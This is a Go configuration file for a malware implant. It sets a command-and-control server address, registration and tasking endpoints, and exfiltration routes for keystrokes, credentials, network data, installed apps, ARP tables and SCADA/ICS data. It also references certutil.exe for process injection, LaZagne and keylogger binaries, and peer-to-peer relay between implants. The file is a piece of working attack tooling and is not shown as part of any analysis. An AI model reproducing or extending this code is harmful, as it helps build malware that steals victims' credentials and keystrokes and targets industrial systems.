package config

import "strconv"

var API_URL string
var tempCampaign = "1"
var buildCampaign, _ = strconv.Atoi(tempCampaign)

const API_DOMAIN = "api-atom.stageone.ai"

//const API_DOMAIN = "192.168.1.101"

//const API_DOMAIN = "127.0.0.1"

const API_PORT = "443"

//const API_PORT = "80"

//const API_SCHEME = "http://"

const API_SCHEME = "https://"

//const API_URL = API_SCHEME + API_DOMAIN + ":" + API_PORT

type ApiPathsStructure struct {
	ImplantRegister          string
	GetTasksTemplate         string
	ReplyTaskTemplate        string
	ExfilNetworksTemplate    string
	ExfilKeyloggingTemplate  string
	ExfilCredentialsTemplate string
	ExfilAppsTemplate        string
	ExfilUpdatesTemplate     string
	ExfilArpTemplate         string
	ExfilSCADATemplate       string
}

type ProcessInjectionStructure struct {
	CertUtil string
}

type CfgStructure struct {
	Api  ApiPathsStructure
	Path ProcessInjectionStructure
}

var Config = CfgStructure{
	Api: ApiPathsStructure{
		ImplantRegister:          API_URL + "/implant/new",
		GetTasksTemplate:         API_URL + "/implant/%s/tasks",
		ReplyTaskTemplate:        API_URL + "/implant/%s/task/output",
		ExfilNetworksTemplate:    API_URL + "/implant/%s/exfil/network_interfaces",
		ExfilKeyloggingTemplate:  API_URL + "/implant/%s/exfil/keylogging",
		ExfilCredentialsTemplate: API_URL + "/implant/%s/exfil/credentials",
		ExfilAppsTemplate:        API_URL + "/implant/%s/exfil/apps",
		ExfilUpdatesTemplate:     API_URL + "/implant/%s/exfil/updates",
		ExfilArpTemplate:         API_URL + "/implant/%s/exfil/arp",
		ExfilSCADATemplate:       API_URL + "/implant/%s/exfil/ici",
	},
	Path: ProcessInjectionStructure{
		CertUtil: "C:\\Windows\\System32\\certutil.exe",
	},
}

type BinTypesStructure struct {
	Lazagne   string
	Keylogger string
}

var BinaryTypes = BinTypesStructure{
	Lazagne:   "9a3b6e86-0e61-4b0a-a9c1-59ac67304c23",
	Keylogger: "c8a728ae-75e7-424c-86fe-238332cf72c4",
}

/**
GENERAL CONFIGURATION
*/

const P2P_RETRY_TIMEOUT = 10 // In seconds

/**
DEBUG CONTROLS
*/

const LOG_ENABLED = true
const LOG_TO_FILE = true
const LOG_FILE_PATH = "C:\\Windows\\Tasks\\log.txt"

/**
Global State
*/

var GlobalState = ImplantState{
	CommunicationMode: Internet,
	CampaignId:        buildCampaign,
	Neighbors:         map[string]NeighborStructure{},
	Tasks:             make(PriorityQueue, 0),
	Configuration: ImplantConfigurationState{
		C2PollingRate: 5,
		QueueTimeout:  1,
	},
}

func (state ImplantState) GetRelayImplant() string {
	return state.RelayImplant
}

func (state *ImplantState) AddNeighbor(neighborId string, neighbor NeighborStructure) {
	state.Neighbors[neighborId] = neighbor

	if len(state.Neighbors) == 1 {
		state.RelayImplant = neighborId
	}
}
